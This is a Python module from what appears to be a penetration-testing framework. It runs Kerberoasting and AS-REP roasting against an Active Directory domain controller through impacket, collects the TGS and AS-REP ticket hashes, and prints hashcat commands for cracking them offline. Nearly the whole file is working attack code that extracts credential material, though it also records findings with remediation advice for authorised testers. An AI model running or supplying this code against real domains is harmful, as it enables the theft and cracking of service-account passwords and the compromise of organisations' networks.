"""Kerberoasting and AS-REP roasting — ticket extraction for offline cracking."""
from __future__ import annotations
import asyncio
from typing import Any
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)


def _kerberoast(dc_ip: str, domain: str, username: str, password: str) -> list[dict]:
    """Request TGS tickets for all Kerberoastable SPNs using impacket."""
    hashes: list[dict] = []
    try:
        from impacket.examples.GetUserSPNs import GetUserSPNs
        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal
        # Use impacket's GetUserSPNs equivalent
        import subprocess, sys
        result = subprocess.run(
            [sys.executable, "-m", "impacket.examples.GetUserSPNs",
             f"{domain}/{username}:{password}",
             "-dc-ip", dc_ip, "-outputfile", "/tmp/talisman_kerberoast.txt"],
            capture_output=True, text=True, timeout=60
        )
        if result.returncode == 0:
            try:
                with open("/tmp/talisman_kerberoast.txt") as f:
                    for line in f:
                        if line.startswith("$krb5tgs$"):
                            hashes.append({"hash": line.strip(), "type": "kerberoast"})
            except FileNotFoundError:
                pass
        # Parse stdout for hashes too
        for line in result.stdout.splitlines():
            if line.startswith("$krb5tgs$"):
                hashes.append({"hash": line.strip(), "type": "kerberoast"})
    except Exception as e:
        log.debug("kerberoast_error", error=str(e))
        hashes.append({"error": str(e), "type": "kerberoast"})
    return hashes


def _asrep_roast(dc_ip: str, domain: str, users: list[str]) -> list[dict]:
    """AS-REP roast — get hashes for accounts with pre-auth disabled."""
    hashes: list[dict] = []
    try:
        import subprocess, sys, tempfile, os
        users_file = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
        users_file.write("\n".join(users))
        users_file.close()
        result = subprocess.run(
            [sys.executable, "-m", "impacket.examples.GetNPUsers",
             f"{domain}/",
             "-usersfile", users_file.name,
             "-dc-ip", dc_ip,
             "-no-pass", "-format", "hashcat"],
            capture_output=True, text=True, timeout=60
        )
        os.unlink(users_file.name)
        for line in result.stdout.splitlines():
            if line.startswith("$krb5asrep$"):
                hashes.append({"hash": line.strip(), "type": "asrep"})
    except Exception as e:
        log.debug("asrep_error", error=str(e))
    return hashes


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    domain: str | None = None,
    dc_ip: str | None = None,
    username: str | None = None,
    password: str | None = None,
    kerberoast: bool = True,
    asreproast: bool = True,
    users_list: list[str] | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    host = dc_ip or target.replace("https://", "").replace("http://", "").split("/")[0]
    dom = domain or host
    console.print(f"\n[module] Kerberos Attacks[/module] → [target]{host}[/target]")
    all_hashes: list[dict] = []
    loop = asyncio.get_event_loop()

    if kerberoast and username and password:
        console.print("  Running Kerberoasting...")
        hashes = await loop.run_in_executor(None, _kerberoast, host, dom, username, password)
        all_hashes.extend(hashes)
        valid = [h for h in hashes if "hash" in h and not "error" in h]
        if valid:
            print_finding(f"Kerberoastable hashes: {len(valid)} captured", "high", host)
            console.print(f"  [warning]Crack with: hashcat -m 13100 hashes.txt wordlist.txt[/warning]")
            for h in valid[:3]:
                console.print(f"  [dim]{h['hash'][:80]}...[/dim]")
            if session:
                await session.add_finding(
                    target=host, module="kerberos",
                    vuln_type="kerberoasting",
                    severity="high", confidence="confirmed",
                    title=f"Kerberoasting — {len(valid)} TGS hashes captured",
                    description=(
                        f"Obtained {len(valid)} Kerberos TGS ticket hashes for offline cracking. "
                        "Weak service account passwords can be cracked to yield domain credentials."
                    ),
                    evidence="\n".join(h["hash"][:100] for h in valid[:3]),
                    reproduction=f"GetUserSPNs.py {dom}/{username}:{password} -dc-ip {host}",
                    remediation=(
                        "1. Use long, random passwords (25+ chars) for service accounts.\n"
                        "2. Migrate to Group Managed Service Accounts (gMSA).\n"
                        "3. Enable AES encryption for Kerberos (removes RC4 downgrade)."
                    ),
                    cvss_score=8.8, cwe="CWE-522",
                )

    if asreproast and users_list:
        console.print(f"  Running AS-REP Roasting on {len(users_list)} users...")
        hashes = await loop.run_in_executor(None, _asrep_roast, host, dom, users_list)
        all_hashes.extend(hashes)
        valid = [h for h in hashes if "hash" in h]
        if valid:
            print_finding(f"AS-REP roastable hashes: {len(valid)} captured", "high", host)
            console.print(f"  [warning]Crack with: hashcat -m 18200 hashes.txt wordlist.txt[/warning]")
            if session:
                await session.add_finding(
                    target=host, module="kerberos",
                    vuln_type="asrep_roasting",
                    severity="high", confidence="confirmed",
                    title=f"AS-REP Roasting — {len(valid)} hashes captured",
                    description="Accounts with Kerberos pre-authentication disabled allow offline password cracking without authenticating.",
                    evidence="\n".join(h["hash"][:100] for h in valid[:3]),
                    remediation="Enable Kerberos pre-authentication on all accounts (remove DONT_REQUIRE_PREAUTH).",
                    cvss_score=7.5, cwe="CWE-287",
                )

    return {"target": host, "hashes": all_hashes, "count": len(all_hashes)}
